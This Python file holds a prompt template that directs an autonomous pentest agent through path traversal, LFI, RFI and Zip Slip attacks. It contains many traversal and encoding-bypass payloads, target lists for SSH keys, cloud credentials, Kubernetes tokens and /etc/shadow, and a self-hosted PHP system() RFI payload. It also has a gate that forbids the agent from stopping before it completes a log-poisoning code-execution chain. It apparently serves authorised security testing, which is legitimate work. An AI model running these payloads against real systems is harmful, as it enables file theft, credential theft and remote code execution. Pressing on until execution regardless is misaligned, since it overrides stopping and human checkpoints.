"""
RedAmon Path Traversal / LFI / RFI Prompts

Black-box workflows for path traversal, Local File Inclusion (LFI), Remote
File Inclusion (RFI), and archive-extraction (Zip Slip) testing.

Synthesis:
- Strix path_traversal_lfi_rfi.md: surface taxonomy, wrapper matrix,
  encoding/normalization bypasses, false-positive hints, OS-specific paths.
- Shannon vuln-injection.txt: OWASP-aligned phase flow (oracle -> confirmation
  -> escalation -> impact), proof-level rigor, false-positive gate. White-box
  / source-trace / deliverable-CLI instructions are stripped -- RedAmon agents
  have no source-code access.

The prompt is parameterised by 5 project-level knobs that gate wrapper
breadth, RFI / OOB callbacks, and archive-write tests. See
`_inject_builtin_skill_workflow` in agentic/prompts/__init__.py for the wiring.
"""


# =============================================================================
# PATH TRAVERSAL MAIN WORKFLOW (.format()-templated; uses {{ }} for literal braces)
# =============================================================================

PATH_TRAVERSAL_TOOLS = """
## ATTACK SKILL: PATH TRAVERSAL / LFI / RFI

**CRITICAL: This attack skill has been CLASSIFIED as Path Traversal / File Inclusion.**
**You MUST follow the workflow below. Do NOT switch to other attack methods.**

This skill covers FIVE primitives that all stem from improper file-path handling:
1. Classic path traversal -- read files outside the intended root via `../`,
   encoded variants, and normalisation gaps
2. Local File Inclusion (LFI) -- coerce the server to include / interpret a
   local file via PHP wrappers, log poisoning, /proc, or template-name injection
3. Remote File Inclusion (RFI) -- coerce the server to fetch and execute a
   remote resource through `http://`, `ftp://`, or language-specific stream handlers
4. Archive-extraction (Zip Slip) -- supply an archive whose entries escape the
   target directory via `../` paths or absolute paths
5. Broken-authorization file read (NO `../` needed) -- the target file lives
   INSIDE a directory the app already serves, but an access-control rule on ONE
   handler (a web-server `deny` / `FilesMatch` / `location` block, an `.htaccess`,
   a WAF path rule, an auth gate) blocks it. A SECOND handler that reaches the
   SAME storage (the framework's own file-serving route, a different alias, an
   unauthenticated preview/export endpoint) serves the exact same resource with
   no such rule. The win is requesting the identical resource NAME through the
   unrestricted handler -- no escape, no encoding, no wrapper.

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
OOB callback (RFI + blind LFI oracle):       {path_traversal_oob_callback_enabled}
PHP wrapper / log poisoning sub-section:     {path_traversal_php_wrappers_enabled}
Archive-extraction (Zip Slip) write tests:   {path_traversal_archive_extraction_enabled}
Bypass + encoding payload reference table:   {path_traversal_payload_reference_enabled}
Request timeout:                             {path_traversal_request_timeout}s
OOB provider:                                {path_traversal_oob_provider}
```

**Hard rules:**
- Read-only proofs are sufficient. ALWAYS prefer reading a small canonical file
  (`/etc/hosts`, `C:\\Windows\\win.ini`) BEFORE noisy reads of large logs or
  binary blobs. A confirmed `127.0.0.1 localhost` line is a full Level-3 proof.
- ALWAYS run Step 1 (graph-driven sink inventory) BEFORE firing payloads. Spraying
  `?file=../../etc/passwd` against every URL trips WAFs and burns the engagement.
- Traversal ESCAPE is only one of two read primitives. The target file is very
  often INSIDE a directory the app already serves, blocked only by an ACL on one
  route. Do NOT assume you must escape to `/etc/*`. Run the same-directory /
  alternate-handler read (Step 4E) EARLY -- it needs no `../`, no encoding, no
  wrapper, and it is the whole solution on a large class of targets.
- A 403 / 401 (as opposed to 404) on a file path is a POSITIVE result, not a
  wall: the resource EXISTS and is named EXACTLY as requested. Record the exact
  name and carry it into Step 4E. NEVER infer "this is a directory" from a 403
  alone -- a per-file deny rule (`FilesMatch "^name$"`, `location = /name`,
  an `.htaccess deny`) returns 403 on BOTH `/name` AND `/name/`, identical to a
  forbidden directory. Prove file-vs-directory by reading the exact name through
  another handler BEFORE brute-forcing children under `/name/`.
- A sink that faithfully serves files WITHIN its base but blocks escape (e.g.
  `dir/../dir/known` returns 200 while `dir/../../x` returns 404) is NOT a dead
  sink -- it is a working arbitrary-IN-BASE read primitive. That is a FINDING,
  not a dead end: enumerate sensitive in-base names through it (Step 4E) before
  spending the engagement on escape/encoding bypasses.
- NEVER claim disclosure from a single 200 response. The same body might be a
  generic `200 OK` for a sanitised join. Confirm with content match (look for the
  expected file's first line) AND a control read of an in-root file from the same
  endpoint.
- If `Archive-extraction (Zip Slip) write tests: False`, do NOT upload archives
  with `../` entries. Stop at archive read-only inspection.
- If `OOB callback: False`, do NOT register an interactsh domain or route RFI /
  blind-LFI exfiltration through EXTERNAL infrastructure (public callback
  servers, oast providers, NAT-exposed tunnels). This does NOT forbid
  self-hosted RFI on a box YOU control that the target reaches over a network
  they share (Step 4C, Mode 1) -- that is in-band, in-scope lab infra and is
  always available. Beyond that, limit testing to in-band reads and timing oracles.
- If `PHP wrapper / log poisoning sub-section: False`, do NOT attempt
  `php://filter`, `data://`, `expect://`, `zip://`, or log-poisoning chains.
  Stick to plain-path traversal payloads.

---

## MANDATORY WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

Before crafting any payload, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method, e.parameters LIMIT 100
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' AND (p.name =~ '(?i).*(file|path|template|include|page|view|download|export|report|log|dir|theme|lang|name|doc|src|image|asset).*') RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_host>' RETURN b.url
```

The Technology node is critical -- it tells you which file-inclusion primitive
to prioritise:
- PHP / Laravel / WordPress / Drupal / Joomla -> `php://filter`, log poisoning,
  `include()`-driven LFI, RFI when `allow_url_include` is on
- Java / Spring / Tomcat / JSP -> JSP `<jsp:include>`, classpath traversal,
  Velocity / Freemarker template-name injection
- Python / Flask / Django -> `open()` / `send_file` / Jinja2 template loading,
  `request.files`-handler quirks
- Node.js / Express / Next.js -> `fs.readFile`, `path.join` mis-use,
  `next/image` and asset proxies, EJS `include`
- .NET / IIS -> static file handler quirks, `Server.MapPath`,
  `~/path` resolution, double-decoding via the IIS request filter
- nginx in front of any backend -> alias-without-trailing-slash and `..;` parser
  differential bugs

If the graph has parameter and tech data, skip discovery and jump to Step 3 with
a ranked sink list. If the graph is sparse, do Step 2 first.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Surface candidate sinks (execute_curl, execute_playwright, execute_ffuf)

Map the request surface to candidate sinks. Look for parameters and endpoints
that consume a path, file name, or URL scheme:

```
execute_curl({{"args": "-s -i 'http://TARGET/path?file=test'"}})
execute_playwright({{"url": "http://TARGET/path", "format": "html"}})
```

High-yield surface patterns:
- Download / preview / export endpoints: `?file=`, `?path=`, `?download=`,
  `?export=`, `?report=`
- Image and asset proxies: `?image=`, `?img=`, `?avatar=`, `?logo=`, `?src=`
- Template / theme / language switchers: `?template=`, `?theme=`, `?lang=`,
  `?view=`, `?layout=`
- Log readers and admin diagnostic endpoints: `?log=`, `?file=`,
  `/admin/log/`, `/api/logs?path=`
- Document or spreadsheet renderers, PDF / image converters
- Archive / ZIP / TAR import endpoints in admin or migration UIs
- Static-file servers fronted by nginx with `alias`-style locations
- File-upload temporary paths (race window for inclusion before relocation)

When the graph is empty, fuzz hidden file-handling paths with ffuf:

```
execute_ffuf({{"args": "-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://TARGET/FUZZ -mc 200,301,302,403 -ac -noninteractive"}})
```

For per-parameter discovery on a known endpoint use `execute_arjun` to surface
hidden `file=` / `path=` / `template=` parameters before fuzzing values.

### Step 3: Establish a deterministic oracle (BEFORE noisy payloads)

You cannot prove path traversal without a deterministic oracle. Pick the
LEAST noisy oracle that fits the channel:

**Option A -- in-band content read (preferred when responses are visible)**

Send a control payload that should NOT escape the root, then a minimal
traversal payload that SHOULD escape, and diff the responses:

```
execute_curl({{"args": "-s --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=hosts.txt'"}})
execute_curl({{"args": "-s --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../etc/hosts'"}})
```

Look for:
- The signature of `/etc/hosts` (`127.0.0.1\\tlocalhost`, `::1\\tip6-localhost`)
  in the second response but NOT the first -> traversal confirmed.
- A 500 stack trace echoing a real filesystem path -> error-based oracle.
- Identical responses despite different ESCAPE payloads -> the input is
  normalised or bound to its base directory. This does NOT kill the sink: it
  still faithfully serves any file WITHIN its base (confirm with
  `dir/../dir/known` == 200 while `dir/../../x` == 404). Before pivoting, run the
  same-directory / alternate-handler read (Step 4E): enumerate sensitive in-base
  names through this handler and re-request every ACL-blocked (403/401) sibling
  you have seen. Only pivot after Step 4E is exhausted.

**Option B -- timing-based gate (when output is suppressed)**

If the response body is uniform regardless of the path, time a known-large
read against a known-tiny read:

```
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../etc/hosts'"}})
execute_curl({{"args": "-s -o /dev/null -w '%{{time_total}}\\\\n' --max-time {path_traversal_request_timeout} 'http://TARGET/download?file=../../../../var/log/syslog'"}})
```

A consistent multi-second delta when reading a large file vs a tiny one is a
medium-confidence reachability signal. Promote to high once you also see a
content differential.

**Option C -- OOB DNS oracle (CONDITIONAL on `OOB callback`=True)**

If OOB callbacks are enabled, see the **OOB / RFI Workflow** section below for
the interactsh setup that doubles as an RFI oracle.

### Step 4: Confirm exactly ONE primitive (OWASP Stage 1: Confirmation)

You MUST reach Level 1 proof on ONE primitive before moving on. Do not chain
primitives in parallel -- the WAF will fingerprint and block you.

#### 4A-zero. MANDATORY when the payload sits in the URL PATH (not a query value): defeat YOUR OWN client's normalisation first

Traversal payloads fall into two positions, and they fail for OPPOSITE reasons:
- **Query / parameter position** (`?file=../../etc/hosts`, `?path=...`): the `../`
  travels inside a parameter VALUE. Your HTTP client transmits it verbatim, so a
  failure here means the SERVER filtered or bound it -- move to encodings / 4A-ter.
- **URL-path position** (`/<prefix>/../etc/hosts`, `/<prefix>..%2f...`, a raw-path
  or `..;` parser form): the `../`, `//` and `.` live in the request-line PATH.
  Every ordinary HTTP client REWRITES this before it leaves your process -- `curl`
  folds `../` and merges `//`, and `requests` / `httpx` / browsers re-encode and
  resolve dot-segments -- so the server NEVER receives the sequence you typed. A
  path-position payload that "does nothing" has almost always been eaten by YOUR
  OWN tooling, not the target.

So for ANY path-position payload you MUST send the request line byte-for-byte,
un-normalised, before concluding it failed:
- `curl --path-as-is 'http://HOST/<the exact raw path>'` (disables curl's
  dot-segment folding), or
- a raw socket that writes the literal request line verbatim
  (`GET <raw path> HTTP/1.1` + `Host:` header via Python `socket`) -- the only
  fully faithful channel for encoded dots, mixed separators, `..;`, and NUL /
  overlong forms.

Re-fire EVERY path-position form (from 4A and 4A-ter) through one of these raw
channels against a known OUT-OF-BASE proof file before deciding the sink is not
traversable. A payload that returns the normalised root/baseline through a normal
client but was never re-sent raw is UNTESTED, not negative. Skipping this is the
single most common reason a genuinely-vulnerable path-position sink is wrongly
declared dead.

#### 4A. Plain path traversal (most common, try first)

Start with the simplest payload, escalate only if filtered. The agent's first
five attempts on a Unix sink:

```
?file=/etc/hosts                                   # absolute (passes joins that bind to a root)
?file=../../../../etc/hosts                        # relative
?file=..%2f..%2f..%2f..%2fetc%2fhosts              # URL-encoded slash
?file=%2e%2e%2f%2e%2e%2fetc%2fhosts                # encoded dots
?file=....//....//etc/hosts                        # double-dot fold (Tomcat / nginx variants)
```

Windows variants:

```
?file=C:\\Windows\\win.ini
?file=..\\..\\..\\Windows\\win.ini
?file=..%5c..%5c..%5cWindows%5cwin.ini
?file=/c:/windows/win.ini
?file=..\\..\\..\\boot.ini
```

Server-mismatch variants (when nginx / a reverse proxy fronts the app):

```
/static/..;/../etc/hosts
/static/%2e%2e%2fetc%2fhosts
/static/..%252f..%252fetc%252fhosts                # double-encoded for double-decoders
/static/.%252e/etc/hosts
```

Web-server **alias off-by-slash** (a `location /<prefix>` whose `alias` / `Alias`
maps the prefix to a filesystem directory, but the LOCATION is written WITHOUT a
trailing slash): the prefix immediately followed by `../` with NO separating slash
escapes into the PARENT of the mapped directory. `/<prefix>../<name>` reads one
level above the served root, `/<prefix>../../<name>` two levels, and so on.
Enumerate this against ANY path prefix that behaves like a mapped static root
(serves raw files, exposes an autoindex, or returns file bodies), not only ones
literally named for assets. This is a PATH-position payload, so it ONLY works when
sent raw (see 4A-zero) -- a client that normalises `/<prefix>../` down to `/`
before sending will silently hide a live off-by-slash escape.

**MANDATORY off-by-slash gate.** Whenever a location prefix `/P` and `/P/` return
DIFFERENT responses (status / length / body differ), OR any error, header, or
autoindex discloses a filesystem or alias/docroot path bound to `/P`, that prefix
is alias-mapped -- you MUST fire the RAW off-by-slash escape
`GET /P../<known-out-of-base proof>` (NO slash between the prefix and `..`, sent
un-normalised per 4A-zero) and, if it returns a body, `GET /P../` to autoindex the
PARENT directory, BEFORE spending further budget fuzzing files *under* `/P`.
Enumerating the children of an alias-mapped prefix while never escaping ABOVE it is
a recurring run-loser: on this bug the sink is the directory boundary itself, not
the files inside it. A prefix that reads like an application route (`app` / `panel` /
`portal` / `console` / `dashboard`, or any authoritative-sounding word) is NOT
exempt -- classify it by the `/P`-vs-`/P/` behaviour and any disclosed path, never
by its name, and try the escape before declaring the prefix a dead app route.

Capture the first oracle hit, record the exact payload form, and move on.

#### 4A-proxy. Server-side FETCH proxies: the fixed path/URL prefix is itself an escape target

Distinct from a local filesystem read: when a handler takes your input and FETCHES
an internal resource whose location it builds as `<fixed-prefix>/<your-input>` -- an
image / file / object / download proxy that server-side does
`fetch("scheme://host/<container>/" + input)` or `open(BASE_DIR + "/" + input)` -- the
hardcoded prefix in FRONT of your input is a boundary you can climb OUT of, exactly
like a directory root. The app only ever references ONE container/prefix in its UI,
but the backend it proxies to almost always exposes SIBLINGS the UI never links.
- Inject `../` and its encodings (`%2e%2e%2f`, `..%2f`, double-encoded
  `%252e%252e%252f`, backslash `..\`, and mixed) INSIDE your segment to step above
  the fixed prefix and reach sibling containers / directories on the backend.
- Beware handlers that keep only the LAST path segment of your input (a `split('/')`
  or `basename` on the request path): a plain `/../sibling/name` collapses to `name`.
  Smuggle the traversal INSIDE the final segment with encoded separators
  (`..%2f..%2fsibling%2fname`) so it survives the split and only decodes backend-side.
- Do NOT treat the one container the UI references as the whole surface. Once you can
  reach siblings, ENUMERATE sibling container / directory / object names with a
  content-discovery wordlist -- a readable secondary store (backups, dumps, config,
  internal data) sitting beside the public one is the usual prize. The app-referenced
  container is a STARTING point, not the boundary; do not declare the surface
  exhausted from it alone.

#### 4A-ter. Identical failures across encodings = a STRIPPING SANITIZER, not a whitelist

If several *different* traversal encodings all collapse to the EXACT SAME
soft-negative (same body, same length, same status), do NOT conclude "the app
whitelists / uses basename() / only resolves inside a fixed directory." Identical
responses across distinct payload families are the FINGERPRINT of a server-side
sanitizer that removes traversal tokens from your input before using it -- the
sink is very often still fully traversable once you defeat the stripper. This is
a signal to ENUMERATE the stripper's blind spots, never to abandon the sink.

A common weakness is that such sanitizers run only ONCE over the string (they do
not re-scan their own output), so a payload whose *residue* after a single removal
still resolves to a traversal step slips through -- which is exactly why one crafted
form can succeed where the plain families all failed. Do not try to reason out
"which" filter it is; enumerate against it:
- Fire the FULL bypass corpus from the reference table (every encoding, separator,
  fold, nesting, double-decode and OS variant it lists) as ONE wave against a known
  OUT-OF-BASE proof file (e.g. `/etc/hosts` or `/etc/passwd`) -- do not stop at the
  first family that returns the soft-negative.
- Diff the responses and keep any token whose response DIFFERS from the baseline;
  that survivor is your working escape. Treat a size/status change from the
  soft-negative as a HIT to confirm, not noise.
- **A single-pass stripper that removes MORE THAN ONE token needs DEEPER nesting,
  not one fixed double.** When the filter deletes several sequences (e.g. both
  `../` and `./`, or their backslash forms), the shallow `....//` fold can be
  over-eaten -- one rule reconstitutes the step and a second rule immediately
  consumes it again, so the residue is NOT `../`. Do not conclude the doubling
  trick "does not work"; ESCALATE it: sweep a LADDER of nesting depths and
  interleavings (more dots, more separators, and the other stripped token wrapped
  around the target one) as its own oracle wave, so that after exactly one removal
  of every rule the surviving residue collapses to `../`. Enumerate the ladder
  (shallow -> deeper) against the /etc/passwd proof file and READ the winning depth
  from the diff -- the correct nesting is DISCOVERED per filter, never assumed to
  be the first double you tried.
Only once the whole corpus is on record and every form returned the identical
soft-negative may you entertain "whitelist / basename" as the explanation.

#### 4A-bis. Classify the sink: INCLUDE/execute vs STREAM/read (MANDATORY before you decide RCE is "unnecessary")

Reading a NON-code file (`/etc/passwd`, `/etc/hosts`) proves traversal but does NOT tell
you whether the sink `include()`s / interprets the path or merely streams bytes
(`file_get_contents` / `readfile` / `sendFile`) -- both echo `/etc/passwd` identically. You
MUST run a positive discriminator BEFORE concluding "simple file read, no execution, RCE
unnecessary" -- that inference, drawn from a non-code file, is a recurring run-loser:

- **Include a file you KNOW contains server code** -- the app's OWN source reached via the
  traversal (its index / router / config script, which definitely holds `<?php` / JSP /
  template code) -- and read HOW it comes back:
  - rendered HTML, or a BLANK / zero-length / truncated body, or a parse/500 error -> the
    file was INTERPRETED: the sink is an `include`/`require`, so **code execution is on the
    table**. A code file that does NOT echo its own source is EXECUTING, not "absent".
  - the literal `<?php ... ?>` / raw source text comes back -> the sink STREAMS bytes (or a
    wrapper de-fanged execution); source disclosure is your primitive.
- A **blank / zero-length** response from including a code file is the STRONGEST signal that
  the sink executes -- do NOT read it as "file missing / wrong traversal depth" and do NOT
  let it send you back to brute-forcing flag filenames. When the sink executes and the datum
  you need lives inside a file that will not echo (it is itself interpreted), the ONLY way to
  read it is to GAIN execution (log / session poisoning, 4B) and print it as data.

Do NOT record "file_get_contents / no execution / RCE unnecessary" for a sink until this
include-vs-stream discriminator is on record.

#### 4B. PHP wrappers and log poisoning (CONDITIONAL on `PHP wrappers`=True)

When the target is PHP-based and the basic traversal is filtered, escalate to
wrapper-driven LFI. See the **PHP Wrappers + Log Poisoning Workflow** section
below for the full payload list and chain logic.

#### 4C. Remote File Inclusion -- LFI's sibling; test it on ANY `include`/`require` sink

A parameter that feeds a language `include()` / `require()` (PHP), a template
loader, or any "load this path and interpret it" primitive is an RFI candidate,
NOT just an LFI one. Whenever plain local traversal on such a parameter is
filtered, normalised, or returns nothing, PIVOT to remote inclusion BEFORE
abandoning the sink -- a failed LOCAL read never proves an inclusion sink dead.
RFI needs (a) a sink that fetches+interprets a URL and (b) a server the TARGET
can reach. Two delivery modes; ALWAYS try Mode 1 first:

**Mode 1 -- self-hosted on your own box (NO external OOB; always available).**
In an isolated lab / internal engagement the target usually has NO internet
egress but CAN reach an attacker host on a network it shares. Host the payload
yourself and point the sink at your own IP -- this is in-band, in-scope infra
you control, so it does NOT depend on the external-OOB toggle:

1. Find an address the target can reach you on: enumerate every network your
   box shares with the target plus the target's default gateway
   (`kali_shell` -> `ip -o addr`, `ip route`). On container/bridged labs the
   shared-subnet IP or the `.1` gateway is almost always routable back to you.
2. Stand up a plain HTTP server serving your payload file:
   ```
   kali_shell({{"command": "mkdir -p /tmp/rfi && printf '%s' '<?php system(\\"id\\"); ?>' > /tmp/rfi/p.php && cd /tmp/rfi && (python3 -m http.server 8000 >/tmp/rfi.log 2>&1 &) && echo up"}})
   ```
3. **Match the sink's exact path construction.** Inclusion sinks frequently
   CONCATENATE a fixed suffix onto your input -- the code may be
   `include($param . '/loader.php')`. Then your input is never the whole path
   (which is exactly why a bare local file read fails), and your REMOTE payload
   must live at that appended suffix under your server root. Recover the suffix
   from an error/warning, a redirect, or by diffing which path the sink reports
   missing; then create it. Example: if the appended suffix were `/loader.php`,
   serve `/tmp/rfi/loader.php` and pass `param=http://<your-ip>:8000` so the sink
   builds `http://<your-ip>:8000/loader.php`. If nothing is appended, host any
   name and pass the full URL to it.
4. Fire the include and read command output INLINE:
   ```
   execute_curl({{"args": "-s 'http://TARGET/vuln.ext?param=http://YOUR_IP:8000'"}})
   ```
   A remote include that executes returns your payload's OUTPUT in the response
   body (Level-4 RCE), not merely a network ping. Prove execution with a
   harmless `id`/`uname -a` first, then read the objective.

Scheme/round-trip variants when the plain `http://` form is rejected:
```
param=http://YOUR_IP:PORT/                  # plain
param=//YOUR_IP:PORT/                        # protocol-relative (bypasses some scheme allowlists)
param=ftp://YOUR_IP:PORT/                    # alternate protocol
param=http://YOUR_IP:PORT/x%00              # legacy null-suffix strip (old runtimes)
```

**Mode 2 -- external OOB oracle (CONDITIONAL on `OOB callback`=True).** Only when
you genuinely cannot self-host reachably (true egress-only blind sink): use the
interactsh oracle in the **OOB / RFI Workflow** section below to prove the sink
fetches remote URLs.

#### 4D. Archive extraction / Zip Slip (CONDITIONAL on `Archive-extraction`=True)

When the target accepts archive uploads (ZIP / TAR / TGZ / 7z) for plugin
import, theme upload, backup restore, or report ingest, see the **Archive
Extraction Workflow** below. This primitive WRITES files outside the intended
extraction directory; gate it strictly on the project-level toggle.

#### 4E. Same-directory read via an alternate handler (broken authorization)

**Run this EARLY -- before you exhaust escape bypasses -- and ALWAYS whenever
escape is blocked but in-base normalisation works.** Many targets never require
`../` at all: the sensitive file sits inside a directory the application already
serves, and the only thing between you and it is an access-control rule attached
to ONE route. The same bytes on disk are frequently reachable through more than
one handler:

| Handler A (often ACL-protected) | Handler B (often unrestricted) |
|---|---|
| Web-server static alias (`/assets/<name>`, nginx/Apache `Alias`) | App file-serving route (`/download?file=<name>`, `/view?path=<name>`) |
| A path carrying `deny` / `FilesMatch` / `.htaccess` / a WAF rule | The framework's own `send_file` / `readfile` / `res.sendFile` endpoint |
| A signed or authenticated download URL | An unauthenticated preview / export endpoint over the same store |

Mechanical procedure (do each step; do not skip on intuition):

1. **Inventory every handler that reaches the same storage.** If a page loads
   its OWN assets through an application route with a path/file parameter, that
   route serves the same directory tree as the web-server static path -- and
   usually without the web-server's ACL. Prove it: fetch a known in-base file
   through that route and confirm a raw file body (correct `Content-Type` /
   `Content-Disposition`), not a rendered page.
2. **Take every 403/401 you have observed and re-request that EXACT name through
   each OTHER handler.** The blocked path already leaked the precise filename --
   do not re-guess it. A resource denied on Handler A is very often 200 on
   Handler B. This single move is the entire exploit on many targets.
3. **Enumerate sensitive in-base names through the unrestricted handler**,
   requesting the BARE name first and only then extension variants -- secrets are
   frequently stored extensionless or with an unexpected extension (e.g. a bare
   `secret`, `backup`, `.env`, `config`, `id_rsa`, or `credentials`). Do NOT
   assume a `.txt`/`.html` suffix; if a name shows up 403 on one handler, request
   that literal name (no suffix added) on the other.
4. **Confirm by content**, not status code: the body must be the real file
   (matches its expected first bytes / signature), served as a raw file rather
   than echoed back into a template.

This primitive uses no encoding tricks, no wrappers, and no OOB -- it is pure
authorization confusion between two handlers over one filesystem. Exhaust it
before escalating to escape / encoding / wrapper chains, and never conclude
"no file read here" while an ACL-blocked resource name has not been tried
through every alternate handler.

### Step 5: Fingerprint the disclosure context (OWASP Stage 2)

Once Step 4 produces a Level 1 read, characterise WHAT you can read.
Run a one-shot enumeration across the same primitive that succeeded:

```
?file=../../../../etc/passwd               # users + UID/GID + shells
?file=../../../../etc/issue                # distro identification
?file=../../../../proc/version             # kernel + compiler
?file=../../../../proc/self/status         # current process uid/gid/groups + container hints
?file=../../../../proc/self/cgroup         # docker / kubepods marker
?file=../../../../proc/self/environ        # environment variables (often leaks secrets)
?file=../../../../proc/self/cmdline        # exact process command line
```

Capture (Level 2 proof = sink and execution context understood):
- **Identity:** uid, gid, supplementary groups (from `/proc/self/status`)
- **Host:** kernel, distro, hostname (`/proc/sys/kernel/hostname`)
- **Containerisation:** `/proc/self/cgroup` mentions `docker` or `kubepods`?
  `/proc/1/cgroup` shares the same cgroup tree?
- **App layout:** read `/proc/self/cmdline` to learn the binary path, then
  walk back to the application root and target its config files

For Windows targets the equivalent enumeration set:

```
?file=C:\\Windows\\win.ini
?file=C:\\Windows\\System32\\drivers\\etc\\hosts
?file=C:\\inetpub\\wwwroot\\web.config
?file=C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
```

If the response is binary-clean text only (e.g. PHP `include()` echoes only
parsed output), you're in an LFI sink, NOT a download sink. Switch to the
`php://filter/convert.base64-encode/resource=...` wrapper to read source
verbatim (see PHP wrappers section).

### Step 6: Targeted exfiltration (OWASP Stage 3)

Read-only proofs that demonstrate impact (always allowed):

```
?file=../../../../etc/shadow                                       # root-only -> 403/empty is INCONCLUSIVE (usually a WAF/ACL block); confirm read via /etc/passwd first
?file=../../../../home/<user>/.ssh/id_rsa                          # SSH private keys
?file=../../../../root/.ssh/authorized_keys                        # backdoor confirmation
?file=../../../../etc/nginx/nginx.conf
?file=../../../../etc/apache2/apache2.conf
?file=../../../../var/www/html/.env                                # framework env files
?file=../../../../var/www/html/wp-config.php                       # WordPress DB creds
?file=../../../../var/www/html/config/database.yml                 # Rails DB config
?file=../../../../var/www/html/application/config/database.php
?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token   # k8s SA token
?file=../../../../etc/kubernetes/admin.conf                            # kubeadm cluster admin
```

Cloud-credential targets (when /proc/self/environ hinted at cloud):

```
?file=../../../../home/<app_user>/.aws/credentials
?file=../../../../root/.aws/credentials
?file=../../../../home/<app_user>/.config/gcloud/application_default_credentials.json
?file=../../../../home/<app_user>/.azure/credentials
```

Every read should be small and canonical. If a `~/.aws/credentials` file
appears, capture the AccessKeyId and stop -- DO NOT enumerate the wider
filesystem just to be thorough. The Level-3 proof is the credential itself.

### Step 7: Long-running automation

For broad fuzzing of file/path parameters with nuclei LFI templates:

```
execute_nuclei({{"args": "-u http://TARGET -tags lfi,fileinclusion,traversal -severity critical,high,medium -timeout 10"}})
```

For deep ffuf-driven fuzzing of a known traversal sink with payload lists:

```
execute_ffuf({{"args": "-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'http://TARGET/download?file=FUZZ' -mc 200,301 -fs 0 -ac -noninteractive"}})
```

Long-running ffuf / nuclei runs (>120s) should go to a file and be polled:

```
kali_shell({{"command": "nohup ffuf -w WORDLIST -u 'http://TARGET/download?file=FUZZ' -of json -o /tmp/ffuf.json > /tmp/ffuf.log 2>&1 & echo $!"}})
kali_shell({{"command": "tail -50 /tmp/ffuf.log"}})
```

### Step 8: Reporting requirements

The final report MUST contain:
- **Primitive** (one of: path_traversal / lfi / rfi / zip_slip)
- **Sink class** (download / template-loader / archive-extractor / static-file-handler)
- **Bypass technique** (encoding / double-decode / null-byte / wrapper / mixed-separator / parser-mismatch)
- **Oracle used** (in-band content / timing / OOB DNS / OOB HTTP)
- **Level reached** (1=oracle, 2=context known, 3=data extracted, 4=critical impact)
- **Files read** (paths + first 200 bytes + content hash for reproducibility)
- **Defenses observed** (WAF model + bypass form, allowlist enforcement, normalisation library)
- **Exact reproducer** (full URL or curl command, payload encoded as actually sent)

### Proof Levels (Shannon-derived rigor framework)

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Oracle fired (content / timing / OOB) on ONE traversal payload | POTENTIAL (low conf) |
| 2 | `/etc/hosts` or equivalent canonical file content matched, app context fingerprinted | POTENTIAL (med conf) |
| 3 | Sensitive file read (creds, keys, tokens, source code) | EXPLOITED |
| 4 | RCE via wrapper chain (log poison + LFI -> exec, RFI -> shell) or cluster-wide credential theft | EXPLOITED (CRITICAL) |

A Level-1 finding with NO bypass attempts AND no Level-2 confirmation is a
**FALSE POSITIVE** -- do NOT report it. Only Level 3+ ships as exploited;
Level 1-2 with documented external blockers (auth, infra) ships as POTENTIAL.

### False positive gate

Before classifying a finding, verify:
- Is the response body actually file content, or a generic 200 OK rendered by a
  router with the original parameter echoed back? Echoing the parameter is NOT
  proof.
- Did the same payload work on a SECOND endpoint, or only one? Single-shot
  hits in CDN-cached responses are sometimes stale cache replays, not live reads.
- Could the apparent disclosure be a virtual-path content store (DB, S3) rather
  than a real filesystem? Test with a Windows-only path (`C:\\Windows\\win.ini`)
  on a Linux sink -- a 200 with WIN.INI contents on a Linux box means you're
  hitting a fake filesystem and the finding is a false positive.

### Abandonment gate (you may NOT declare a file-read sink dead until...)

Escape being blocked is NOT sufficient grounds to abandon a file-serving sink or
to switch skills. Before you conclude "no file-read vulnerability here", ALL of
the following must be on record for each confirmed sink:
- [ ] Escape attempted with at least the encoding families in the reference table.
- [ ] If several distinct traversal encodings all returned the IDENTICAL soft-negative,
      that was treated as a stripping-sanitizer signature (not a whitelist), and the
      full bypass-corpus sweep-and-diff (Step 4A-ter) is on record before any
      "whitelist / basename" conclusion.
- [ ] In-base normalisation behaviour recorded (does `dir/../dir/known` return
      200 while `dir/../../x` returns 404? -> arbitrary-IN-BASE read primitive,
      keep going via Step 4E).
- [ ] Every 403/401 resource you have seen re-requested by its EXACT name through
      each alternate handler that reaches the same storage (Step 4E).
- [ ] Sensitive in-base names enumerated through the unrestricted handler,
      bare-name-first, with and without extensions.
- [ ] If the parameter feeds an `include`/`require`/template-load sink (it
      INTERPRETS the path rather than merely streaming bytes), REMOTE inclusion
      tested: self-hosted RFI (Step 4C, Mode 1) attempted from an address the
      target can reach, with the sink's appended suffix (if any) matched. Failed
      LOCAL reads NEVER close an inclusion sink until remote inclusion has also
      failed.
- [ ] If the sink INTERPRETS the path AND direct reads EXECUTE rather than disclose
      (an interpreted target -- PHP/JSP/etc. -- returns blank or a parse error instead
      of its source, or the datum you need lives inside a file that is itself executed),
      a LOCAL code-execution read has been EXECUTED end-to-end -- not merely planned:
      poison a writable sink the app records (access/error log, session file,
      `/proc/self/environ`), INCLUDE it, and READ the command output. A blank /
      zero-length / parse-error response from including a code file is the TRIGGER to do
      this, not a dead end. You may NOT `switch_skill`, ask for a hint, write a final
      summary, or end the run on "the flag is probably in <file>" while a planned-but-
      unexecuted log/session-poisoning RCE is still outstanding on a confirmed include
      sink -- plan-then-quit does not satisfy this gate; the poison-include-read cycle
      must actually have been sent and its output read.
